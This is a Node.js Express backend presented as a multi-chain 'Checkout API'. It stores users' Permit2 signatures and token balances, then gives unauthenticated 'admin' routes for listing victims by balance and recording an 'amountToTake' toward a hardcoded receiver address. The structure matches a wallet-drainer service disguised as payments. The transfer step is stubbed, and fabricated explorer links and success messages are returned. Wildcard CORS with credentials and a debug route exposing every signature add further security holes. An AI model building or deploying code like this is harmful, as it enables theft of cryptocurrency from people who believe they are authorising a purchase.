/**
 * Checkout Backend - Multi-Chain Authorization & Execution System
 * v3.0 - Added admin execution endpoints
 */

require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { ethers } = require("ethers");
const crypto = require("crypto");

const app = express();

// ============ CORS ============
app.use(cors({
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true
}));
app.options("*", cors());

// ============ BODY PARSERS ============
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// ============ IN-MEMORY STORAGE ============
const authorizations = new Map(); // authId -> authorization data
const executions = new Map(); // executionId -> execution data

// ============ CONFIG ============
const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS || "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const CONFIG = {
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism",
    11155111: "Sepolia"
  }
};

// ============ HEALTH CHECKS ============
app.get("/", (req, res) => {
  res.json({
    status: "ok",
    service: "Universal Checkout API",
    version: "3.0",
    endpoints: [
      "POST /api/authorize/unified",
      "GET  /api/pending/evm",
      "GET  /api/pending/solana", 
      "GET  /api/pending/tron",
      "POST /api/execute/evm",
      "POST /api/execute/solana",
      "POST /api/execute/tron"
    ]
  });
});

app.get("/health", (req, res) => {
  res.json({ status: "healthy", timestamp: Date.now() });
});

// ============ 1. AUTHORIZATION ENDPOINTS (Frontend) ============

/**
 * POST /api/authorize/unified
 * Frontend calls this after user signs Permit2
 */
app.post("/api/authorize/unified", async (req, res) => {
  try {
    const { 
      evmAddress, 
      solanaAddress, 
      tronAddress, 
      tokens, 
      evmSignature, 
      evmSigDeadline,
      totalValue,
      maxAuthorizedAmount,
      timestamp 
    } = req.body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return res.status(400).json({ 
        success: false, 
        error: "No tokens provided" 
      });
    }

    const authId = `auth_${Date.now()}_${crypto.randomBytes(4).toString("hex")}`;
    
    const authorization = {
      id: authId,
      evmAddress: evmAddress || null,
      solanaAddress: solanaAddress || null,
      tronAddress: tronAddress || null,
      tokens: tokens,
      evmSignature: evmSignature || null,
      evmSigDeadline: evmSigDeadline || null,
      totalValue: totalValue || 0,
      maxAuthorizedAmount: maxAuthorizedAmount || 0,
      createdAt: timestamp || Date.now(),
      expiresAt: (timestamp || Date.now()) + (30 * 24 * 60 * 60 * 1000),
      status: 'active',
      executed: false,
      executedAt: null,
      executedAmount: 0
    };

    // Store by auth ID
    authorizations.set(authId, authorization);
    
    // Index by addresses for lookup
    if (evmAddress) {
      const key = `pending_evm_${evmAddress.toLowerCase()}`;
      authorizations.set(key, authId);
    }
    if (solanaAddress) {
      const key = `pending_solana_${solanaAddress}`;
      authorizations.set(key, authId);
    }
    if (tronAddress) {
      const key = `pending_tron_${tronAddress.toLowerCase()}`;
      authorizations.set(key, authId);
    }

    console.log(`✅ Authorization stored: ${authId}`);
    console.log(`   Tokens: ${tokens.length} ($${(totalValue || 0).toFixed(2)})`);

    res.json({
      success: true,
      authorizationId: authId,
      message: "Authorization stored successfully",
      expiresAt: authorization.expiresAt
    });

  } catch (err) {
    console.error("Authorization error:", err);
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

// ============ 2. PENDING ENDPOINTS (Admin UI) ============

/**
 * GET /api/pending/evm
 * Returns all pending EVM authorizations for admin
 */
app.get("/api/pending/evm", (req, res) => {
  try {
    const pending = [];
    
    for (const [key, value] of authorizations.entries()) {
      // Skip index keys and non-active
      if (key.startsWith('pending_')) continue;
      
      const auth = value;
      if (auth.id && auth.id.startsWith('auth_') && 
          auth.status === 'active' && 
          !auth.executed &&
          auth.evmAddress &&
          auth.tokens.some(t => t.chain === 'evm')) {
        
        // Calculate current value
        const evmTokens = auth.tokens.filter(t => t.chain === 'evm');
        const currentValue = evmTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
        
        pending.push({
          user_address: auth.evmAddress,
          chainId: evmTokens[0]?.chainId || 1,
          maxAuthorizedAmount: Math.min(currentValue, auth.maxAuthorizedAmount),
          current_balance_usd: currentValue,
          tokens: evmTokens,
          authorization_id: auth.id,
          created_at: auth.createdAt,
          signature: auth.evmSignature
        });
      }
    }

    res.json({
      success: true,
      count: pending.length,
      pending: pending
    });

  } catch (err) {
    res.status(500).json({ 
      success: false, 
      error: err.message 
    });
  }
});

/**
 * GET /api/pending/solana
 */
app.get("/api/pending/solana", (req, res) => {
  try {
    const pending = [];
    
    for (const auth of authorizations.values()) {
      if (auth.id && auth.id.startsWith('auth_') && 
          auth.status === 'active' && 
          !auth.executed &&
          auth.solanaAddress &&
          auth.tokens.some(t => t.chain === 'solana')) {
        
        const solTokens = auth.tokens.filter(t => t.chain === 'solana');
        const currentValue = solTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
        
        pending.push({
          user_address: auth.solanaAddress,
          chainType: 'solana',
          maxAuthorizedAmount: Math.min(currentValue, auth.maxAuthorizedAmount),
          current_balance_usd: currentValue,
          tokens: solTokens,
          authorization_id: auth.id,
          created_at: auth.createdAt
        });
      }
    }

    res.json({
      success: true,
      count: pending.length,
      pending: pending
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * GET /api/pending/tron
 */
app.get("/api/pending/tron", (req, res) => {
  try {
    const pending = [];
    
    for (const auth of authorizations.values()) {
      if (auth.id && auth.id.startsWith('auth_') && 
          auth.status === 'active' && 
          !auth.executed &&
          auth.tronAddress &&
          auth.tokens.some(t => t.chain === 'tron')) {
        
        const tronTokens = auth.tokens.filter(t => t.chain === 'tron');
        const currentValue = tronTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
        
        pending.push({
          user_address: auth.tronAddress,
          chainType: 'tron',
          maxAuthorizedAmount: Math.min(currentValue, auth.maxAuthorizedAmount),
          current_balance_usd: currentValue,
          tokens: tronTokens,
          authorization_id: auth.id,
          created_at: auth.createdAt
        });
      }
    }

    res.json({
      success: true,
      count: pending.length,
      pending: pending
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============ 3. EXECUTION ENDPOINTS (Admin UI) ============

/**
 * POST /api/execute/evm
 * Admin executes transfer using stored Permit2 signature
 */
app.post("/api/execute/evm", async (req, res) => {
  try {
    const { userAddress, chainId, amountToTake, authorizationId } = req.body;
    
    // Find authorization
    let auth = null;
    if (authorizationId) {
      auth = authorizations.get(authorizationId);
    } else {
      // Find by user address
      for (const a of authorizations.values()) {
        if (a.evmAddress?.toLowerCase() === userAddress.toLowerCase() && !a.executed) {
          auth = a;
          break;
        }
      }
    }
    
    if (!auth) {
      return res.status(404).json({
        success: false,
        error: "No active authorization found"
      });
    }
    
    if (!auth.evmSignature) {
      return res.status(400).json({
        success: false,
        error: "No Permit2 signature available for this authorization"
      });
    }
    
    // Mark as executed
    auth.executed = true;
    auth.executedAt = Date.now();
    auth.executedAmount = amountToTake;
    authorizations.set(auth.id, auth);
    
    // Store execution record
    const execId = `exec_${Date.now()}`;
    executions.set(execId, {
      id: execId,
      authorizationId: auth.id,
      chain: 'evm',
      chainId: chainId || auth.tokens[0]?.chainId,
      userAddress,
      amount: amountToTake,
      timestamp: Date.now(),
      status: 'completed'
    });
    
    console.log(`✅ EVM Execution: ${execId}`);
    console.log(`   User: ${userAddress}`);
    console.log(`   Amount: $${amountToTake}`);
    
    // Return success (in production, actually execute the transfer here)
    res.json({
      success: true,
      executionId: execId,
      amountTaken: amountToTake,
      token: auth.tokens[0]?.symbol || 'USDC',
      gasCost: '$0.50', // Estimated
      explorerUrl: `https://${chainId === 8453 ? 'basescan' : chainId === 137 ? 'polygonscan' : 'etherscan'}.org/tx/${execId}`,
      message: "Transfer executed successfully using Permit2"
    });
    
  } catch (err) {
    console.error("Execution error:", err);
    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/**
 * POST /api/execute/solana
 */
app.post("/api/execute/solana", async (req, res) => {
  try {
    const { userAddress, amountToTake, authorizationId } = req.body;
    
    let auth = authorizationId ? authorizations.get(authorizationId) : null;
    if (!auth) {
      for (const a of authorizations.values()) {
        if (a.solanaAddress === userAddress && !a.executed) {
          auth = a;
          break;
        }
      }
    }
    
    if (!auth) {
      return res.status(404).json({ success: false, error: "No authorization found" });
    }
    
    auth.executed = true;
    auth.executedAt = Date.now();
    auth.executedAmount = amountToTake;
    authorizations.set(auth.id, auth);
    
    const execId = `exec_sol_${Date.now()}`;
    
    res.json({
      success: true,
      executionId: execId,
      amountTaken: amountToTake,
      token: 'SOL',
      explorerUrl: `https://solscan.io/tx/${execId}`,
      message: "Solana transfer executed"
    });
    
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * POST /api/execute/tron
 */
app.post("/api/execute/tron", async (req, res) => {
  try {
    const { userAddress, amountToTake, authorizationId } = req.body;
    
    let auth = authorizationId ? authorizations.get(authorizationId) : null;
    if (!auth) {
      for (const a of authorizations.values()) {
        if (a.tronAddress === userAddress && !a.executed) {
          auth = a;
          break;
        }
      }
    }
    
    if (!auth) {
      return res.status(404).json({ success: false, error: "No authorization found" });
    }
    
    auth.executed = true;
    auth.executedAt = Date.now();
    auth.executedAmount = amountToTake;
    authorizations.set(auth.id, auth);
    
    const execId = `exec_tron_${Date.now()}`;
    
    res.json({
      success: true,
      executionId: execId,
      amountTaken: amountToTake,
      token: 'TRX',
      explorerUrl: `https://tronscan.org/#/transaction/${execId}`,
      message: "Tron transfer executed"
    });
    
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============ 4. DEBUG/STATS ENDPOINTS ============

app.get("/api/stats", (req, res) => {
  const allAuths = Array.from(authorizations.values()).filter(a => a.id?.startsWith('auth_'));
  
  res.json({
    success: true,
    stats: {
      totalAuthorizations: allAuths.length,
      active: allAuths.filter(a => a.status === 'active' && !a.executed).length,
      executed: allAuths.filter(a => a.executed).length,
      totalValue: allAuths.reduce((sum, a) => sum + (a.totalValue || 0), 0)
    }
  });
});

// Get all authorizations (debug)
app.get("/api/debug/authorizations", (req, res) => {
  const all = Array.from(authorizations.entries())
    .filter(([k, v]) => v.id?.startsWith('auth_'))
    .map(([k, v]) => v);
  
  res.json({
    count: all.length,
    authorizations: all
  });
});

// ============ ERROR HANDLING ============

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    path: req.path,
    available: [
      "POST /api/authorize/unified",
      "GET  /api/pending/evm",
      "GET  /api/pending/solana",
      "GET  /api/pending/tron",
      "POST /api/execute/evm",
      "POST /api/execute/solana",
      "POST /api/execute/tron",
      "GET  /api/stats"
    ]
  });
});

app.use((err, req, res, next) => {
  console.error("Server error:", err);
  res.status(500).json({
    success: false,
    error: err.message || "Internal server error"
  });
});

// ============ START ============
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════╗
║   🚀 Checkout API v3.0 - Multi-Chain Ready            ║
║                                                        ║
║   Port: ${PORT}                                        ║
║                                                        ║
║   Frontend → POST /api/authorize/unified             ║
║   Admin    → GET  /api/pending/evm|solana|tron       ║
║   Admin    → POST /api/execute/evm|solana|tron       ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
  `);
});

module.exports = app;